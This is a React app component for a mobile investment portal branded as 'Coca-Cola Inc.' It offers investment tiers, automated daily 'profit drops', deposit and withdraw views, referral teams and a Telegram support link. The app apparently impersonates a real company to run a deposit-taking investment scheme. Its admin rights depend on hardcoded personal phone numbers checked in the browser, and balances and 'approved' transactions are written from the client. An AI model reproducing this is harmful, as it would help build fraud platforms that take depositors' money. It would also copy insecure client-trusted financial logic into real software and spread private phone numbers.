import React, { useState, useEffect } from "react";
import { 
  Home, Store, Users, User, ShieldAlert, ShieldCheck, 
  CreditCard, Lock, HelpCircle, PhoneCall, PiggyBank 
} from "lucide-react";

import { UserProfile } from "./types";
import { INVESTMENT_TIERS } from "./data";
import { auth, db } from "./lib/firebase";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { doc, getDoc, setDoc, onSnapshot, collection, addDoc, serverTimestamp } from "firebase/firestore";

import AuthModal from "./components/AuthModal";
import Navbar from "./components/Navbar";
import HomeTab from "./components/HomeTab";
import TaskTab from "./components/TaskTab";
import VipTab from "./components/VipTab";
import FundTab from "./components/FundTab";
import TeamTab from "./components/TeamTab";
import MineTab from "./components/MineTab";
import AdminPanel from "./components/AdminPanel";
import ChatFAB from "./components/ChatFAB";

import coolingStationImg from "./assets/images/cooling_station_1783296269905.jpg";

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<string>("home");
  const [showTelegramModal, setShowTelegramModal] = useState(false);
  const [mineActiveView, setMineActiveView] = useState<"none" | "deposit" | "withdraw" | "fund">("none");

  const isUserAdmin = (phone?: string) => {
    if (!phone) return false;
    const normalized = phone.replace(/[\s\-\(\)\+]/g, "");
    return (
      normalized === "07077599057" || 
      normalized === "2347077599057" ||
      normalized === "23407077599057" ||
      normalized === "09168410068" ||
      normalized === "2349168410068" ||
      normalized === "23409168410068"
    );
  };

  // Sync with Firebase Auth and Firestore
  useEffect(() => {
    setLoading(true);
    let unsubscribeFirestore: (() => void) | null = null;
    
    // Telegram Modal logic
    if (activeTab === "home") {
        setShowTelegramModal(true);
    }

    const unsubscribeAuth = onAuthStateChanged(auth, async (firebaseUser) => {
      try {
        if (firebaseUser) {
          // Listen to Firestore for real-time user updates
          const userRef = doc(db, "users", firebaseUser.uid);
          
          // Initial fetch attempt
          try {
            const snap = await getDoc(userRef);
            if (snap.exists()) {
              setUser(snap.data() as UserProfile);
            }
          } catch (e) {
            console.error("Initial getDoc failed:", e);
          } finally {
            setLoading(false);
          }

          unsubscribeFirestore = onSnapshot(userRef, (docSnap) => {
            if (docSnap.exists()) {
              setUser(docSnap.data() as UserProfile);
            }
            setLoading(false);
          }, (err) => {
            console.error("Firestore snapshot error:", err);
            setLoading(false);
          });

          // Safety timeout
          const timer = setTimeout(() => {
            setLoading(false);
          }, 5000);
          return () => clearTimeout(timer);
        } else {
          setUser(null);
          if (unsubscribeFirestore) unsubscribeFirestore();
          setLoading(false);
        }
      } catch (err) {
        console.error("Auth state change handler error:", err);
        setLoading(false);
      }
    });

    return () => {
      unsubscribeAuth();
      if (unsubscribeFirestore) unsubscribeFirestore();
    };
  }, []);

  // Update user profile in Firestore
  const handleUpdateUser = async (updatedUser: UserProfile) => {
    try {
      const targetUid = updatedUser.uid || auth.currentUser?.uid;
      if (!targetUid) return;
      const userRef = doc(db, "users", targetUid);
      await setDoc(userRef, updatedUser, { merge: true });
      
      // If we updated the currently logged-in user, also update local state to trigger immediate re-render
      if (auth.currentUser && targetUid === auth.currentUser.uid) {
        setUser(updatedUser);
      }
    } catch (error) {
      console.error("Error updating user profile:", error);
    }
  };

  // Automated 24h Daily Profit Drop Effect
  useEffect(() => {
    if (!user || !user.uid || !user.currentTierId) return;

    const todayStr = new Date().toISOString().split("T")[0];
    if (user.lastTaskDate === todayStr) return;

    const matchedTier = INVESTMENT_TIERS.find((t) => t.id === user.currentTierId);
    if (!matchedTier) return;

    const reward = matchedTier.dailyReward;
    const updatedUser: UserProfile = {
      ...user,
      balance: (user.balance || 0) + reward,
      totalProfit: (user.totalProfit || 0) + reward,
      lastTaskDate: todayStr
    };

    handleUpdateUser(updatedUser);

    try {
      const transRef = collection(db, "users", user.uid, "transactions");
      addDoc(transRef, {
        type: "deposit",
        amount: reward,
        status: "approved",
        timestamp: new Date().toLocaleString("en-NG"),
        details: `Automated Daily Profit Drop: ${matchedTier.name}`,
        createdAt: serverTimestamp()
      });
    } catch (e) {
      console.error("Auto profit transaction error:", e);
    }
  }, [user?.uid, user?.currentTierId, user?.lastTaskDate]);

  const handleLoginSuccess = (loggedInUser: UserProfile) => {
    setUser(loggedInUser);
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      setUser(null);
      setActiveTab("home");
    } catch (error) {
      console.error("Error logging out:", error);
    }
  };

  useEffect(() => {
    if (activeTab === "home") {
      setShowTelegramModal(true);
    }
  }, [activeTab]);

  if (loading) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center relative overflow-hidden font-sans">
        {/* Highly visible background image */}
        <div 
          className="absolute inset-0 bg-cover bg-center transition-opacity duration-1000 scale-105"
          style={{ backgroundImage: `url(${coolingStationImg})` }}
        />
        {/* Semi-transparent dark overlay to protect text readability */}
        <div className="absolute inset-0 bg-slate-950/60" />
        
        {/* Centered Glassmorphic Loading Box */}
        <div className="relative z-10 bg-slate-900/75 border border-white/10 backdrop-blur-md rounded-2xl shadow-2xl p-8 max-w-sm w-full mx-4 text-center space-y-6">
          <div className="relative w-16 h-16 mx-auto flex items-center justify-center">
            <div className="absolute inset-0 border border-[#e41e2b]/20 rounded-full animate-ping" />
            <div className="w-12 h-12 border-4 border-[#e41e2b] border-t-transparent rounded-full animate-spin" />
          </div>
          <div className="space-y-2">
            <h3 className="text-white font-extrabold text-base tracking-tight uppercase font-display">Coca-Cola Inc.</h3>
            <p className="text-[#e41e2b] font-mono text-[10px] uppercase tracking-widest font-bold animate-pulse">
              Initializing Partner Portal...
            </p>
          </div>
        </div>
      </div>
    );
  }

  // If user is not logged in, show secure onboarding auth modal
  if (!user) {
    return (
      <AuthModal 
        onSuccess={handleLoginSuccess}
        initialUser={null}
      />
    );
  }

  // If user is banned, block app usage and show an immersive Account Suspended view
  if (user.isBanned) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4 relative overflow-hidden">
        {/* Decorative ambient radial gradients */}
        <div className="absolute top-[-200px] left-[-200px] w-[500px] h-[500px] bg-red-600/10 rounded-full blur-[100px] pointer-events-none" />
        <div className="absolute bottom-[-200px] right-[-200px] w-[500px] h-[500px] bg-amber-600/10 rounded-full blur-[100px] pointer-events-none" />
        
        <div className="relative z-10 bg-slate-900 border border-red-500/20 rounded-3xl shadow-2xl p-8 max-w-md w-full text-center space-y-6">
          <div className="w-16 h-16 mx-auto bg-red-500/10 border border-red-500/30 rounded-2xl flex items-center justify-center animate-pulse">
            <ShieldAlert className="w-8 h-8 text-red-500" />
          </div>
          
          <div className="space-y-2">
            <h2 className="text-xl font-black text-white tracking-tight uppercase font-display">Account Suspended</h2>
            <div className="h-[2px] w-12 bg-red-500 mx-auto rounded-full" />
            <p className="text-xs text-red-400 font-mono uppercase tracking-widest font-bold">Security Violation Detected</p>
          </div>

          <p className="text-slate-300 text-sm leading-relaxed">
            Your partner registry account <strong className="text-white font-mono">{user.phone}</strong> has been automatically suspended. This is typically caused by multiple suspicious deposit submissions, system exploit attempts, or automated bot activities.
          </p>

          {user.bannedReason && (
            <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl text-left text-xs font-mono text-slate-400 space-y-1">
              <span className="text-red-400 font-bold uppercase tracking-wider text-[10px]">Suspension Details:</span>
              <p>{user.bannedReason}</p>
            </div>
          )}

          <div className="p-4 bg-red-950/20 border border-red-500/10 rounded-xl text-xs text-slate-400 text-center">
            To appeal this automatic safety suspension, please contact your designated Coca-Cola Invest Operations Account Manager with your registration phone number.
          </div>

          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <a 
              href="https://t.me/careeminvest"
              target="_blank"
              rel="noreferrer"
              className="flex-1 bg-red-600 text-white font-bold py-3 rounded-xl hover:bg-red-700 transition duration-150 text-sm flex items-center justify-center gap-2 shadow-lg shadow-red-900/20"
            >
              Contact Operations Support
            </a>
            <button 
              onClick={handleLogout}
              className="flex-1 bg-slate-800 text-slate-300 font-bold py-3 rounded-xl hover:bg-slate-700 transition duration-150 text-sm"
            >
              Log Out Account
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F1F5F9] text-slate-800 flex flex-col pb-24 relative overflow-hidden">
      
      {/* Decorative Blur Backdrops */}
      <div className="absolute top-[-250px] right-[-200px] w-[600px] h-[600px] bg-[#e41e2b]/5 rounded-full blur-[140px] pointer-events-none" />
      <div className="absolute bottom-[-200px] left-[-200px] w-[500px] h-[500px] bg-[#e41e2b]/5 rounded-full blur-[120px] pointer-events-none" />

      {/* Main Header / Navbar */}
      <Navbar 
        user={user}
        onLogout={handleLogout}
        onNavigateToTab={(tab) => setActiveTab(tab)}
        onNavigateToMineView={(view) => {
          setMineActiveView(view);
          setActiveTab("mine");
        }}
      />

      {/* Main Content Area */}
      <main className={`flex-1 w-full mx-auto py-8 relative z-10 ${
        activeTab === "mine" || activeTab === "vip" ? "px-0 sm:px-4 md:px-8 max-w-none" : "max-w-7xl px-4"
      }`}>
        
        {activeTab === "home" && (
          <HomeTab 
            user={user} 
            onUpdateUser={handleUpdateUser}
            onNavigateToTab={(tab) => {
              setMineActiveView("none");
              setActiveTab(tab);
            }}
            onNavigateToMineView={(view) => {
              setMineActiveView(view);
              setActiveTab("mine");
            }}
          />
        )}
        
        {showTelegramModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
            <div className="bg-white p-8 rounded-3xl text-center space-y-6 max-w-sm w-full">
              <h2 className="text-xl font-black text-slate-900">Join Telegram Group</h2>
              <p className="text-sm text-slate-600">Join our official telegram group for latest updates and daily promo codes.</p>
              <a 
                href="https://t.me/careeminvest" 
                target="_blank" 
                rel="noreferrer"
                className="block bg-[#e41e2b] text-white font-bold py-3 rounded-xl hover:bg-[#c41622] transition"
                onClick={() => setShowTelegramModal(false)}
              >
                Join Now
              </a>
              <button 
                onClick={() => setShowTelegramModal(false)}
                className="text-slate-400 text-xs font-bold uppercase hover:text-slate-600"
              >
                Close
              </button>
            </div>
          </div>
        )}

        {activeTab === "task" && (
          <TaskTab 
            user={user} 
            onUpdateUser={handleUpdateUser}
            onNavigateToTab={(tab) => {
              setMineActiveView("none");
              setActiveTab(tab);
            }}
          />
        )}

        {activeTab === "vip" && (
          <VipTab 
            user={user} 
            onUpdateUser={handleUpdateUser}
            onNavigateToTab={(tab) => {
              setMineActiveView("none");
              setActiveTab(tab);
            }}
            onNavigateToMineView={(view) => {
              setMineActiveView(view);
              setActiveTab("mine");
            }}
          />
        )}

        {activeTab === "fund" && (
          <FundTab 
            user={user} 
            onUpdateUser={handleUpdateUser}
          />
        )}

        {activeTab === "team" && (
          <TeamTab 
            user={user}
          />
        )}

        {activeTab === "mine" && (
          <MineTab 
            user={user} 
            onUpdateUser={handleUpdateUser}
            activeView={mineActiveView}
            setActiveView={setMineActiveView}
          />
        )}

        {activeTab === "admin" && isUserAdmin(user.phone) && (
          <AdminPanel 
            user={user} 
            onUpdateUser={handleUpdateUser}
            onNavigateToTab={(tab) => {
            if (tab === "home") setShowTelegramModal(true);
            setActiveTab(tab);
          }}
          />
        )}

      </main>

      {/* Bottom Navigation Bar */}
      <nav className="fixed bottom-0 left-0 right-0 z-40 bg-white border-t border-slate-200 py-2 px-4 shadow-md">
        <div className="max-w-md mx-auto flex items-center justify-around">
          
          <button
            onClick={() => { setMineActiveView("none"); setActiveTab("home"); }}
            className={`flex flex-col items-center space-y-0.5 text-center transition-all ${
              activeTab === "home" ? "text-[#c83a00] font-bold" : "text-slate-400 hover:text-slate-600 font-medium"
            }`}
          >
            <Home className="w-6 h-6 shrink-0" />
            <span className="text-xs">Home</span>
          </button>

          <button
            onClick={() => { setMineActiveView("none"); setActiveTab("vip"); }}
            className={`flex flex-col items-center space-y-0.5 text-center transition-all ${
              activeTab === "vip" || activeTab === "task" ? "text-[#c83a00] font-bold" : "text-slate-400 hover:text-slate-600 font-medium"
            }`}
          >
            <Store className="w-6 h-6 shrink-0" />
            <span className="text-xs">Products</span>
          </button>

          <button
            onClick={() => { setMineActiveView("none"); setActiveTab("team"); }}
            className={`flex flex-col items-center space-y-0.5 text-center transition-all ${
              activeTab === "team" ? "text-[#c83a00] font-bold" : "text-slate-400 hover:text-slate-600 font-medium"
            }`}
          >
            <Users className="w-6 h-6 shrink-0" />
            <span className="text-xs">Team</span>
          </button>

          <button
            onClick={() => { setActiveTab("mine"); }}
            className={`flex flex-col items-center space-y-0.5 text-center transition-all ${
              activeTab === "mine" ? "text-[#c83a00] font-bold" : "text-slate-400 hover:text-slate-600 font-medium"
            }`}
          >
            <User className="w-6 h-6 shrink-0" />
            <span className="text-xs">Profile</span>
          </button>

          {isUserAdmin(user.phone) && (
            <button
              onClick={() => setActiveTab("admin")}
              className={`flex flex-col items-center space-y-0.5 text-center transition-all ${
                activeTab === "admin" ? "text-[#c83a00] font-bold" : "text-amber-500 hover:text-amber-600 font-medium"
              }`}
            >
              <ShieldCheck className="w-6 h-6 shrink-0" />
              <span className="text-xs">Admin</span>
            </button>
          )}

        </div>
      </nav>

      <ChatFAB />
    </div>
  );
}
